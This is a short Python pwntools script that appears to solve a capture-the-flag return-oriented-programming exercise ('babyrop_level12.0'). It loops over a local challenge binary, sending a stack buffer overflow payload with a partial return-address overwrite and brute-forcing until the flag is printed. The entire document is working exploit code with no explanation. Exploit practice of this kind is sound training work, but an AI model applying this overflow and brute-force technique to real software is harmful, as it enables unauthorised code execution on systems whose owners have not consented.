from pwn import *

while True:
    try:
        r = process('/challenge/babyrop_level12.0')
        r.send(b'\x00'*0x88 + p64(0) + b'\x00\x50\x41')
        r.recvuntil(b'### Goodbye!\n')
        a = r.recv(timeout=0.2)

        if b'pwn' in a :
            print(a)
            break
    except:
        continue